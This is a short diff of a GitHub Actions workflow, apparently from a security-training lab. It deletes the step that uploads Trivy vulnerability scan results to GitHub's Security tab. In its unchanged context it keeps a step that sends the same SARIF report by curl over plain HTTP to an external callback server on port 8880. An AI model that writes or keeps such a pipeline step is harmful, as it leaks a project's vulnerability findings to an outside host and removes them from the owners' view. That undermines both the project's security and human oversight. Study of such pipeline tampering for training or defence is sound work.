@@ -33,12 +33,7 @@ jobs:
       with:
           name: trivy-report
           path: trivy-results.sarif
-
-    - name: Upload Trivy scan results to GitHub Security tab
-      uses: github/codeql-action/upload-sarif@v3
-      with:
-          sarif_file: 'trivy-results.sarif'
-            
+          
     - name: Send Trivy report to external server
       run: |
           curl -v -X POST -H "Content-Type: multipart/form-data" -F "file=@trivy-results.sarif" http://3rvz2umdy425l4q0hh4kj.appsecengineer.training:8880/callback
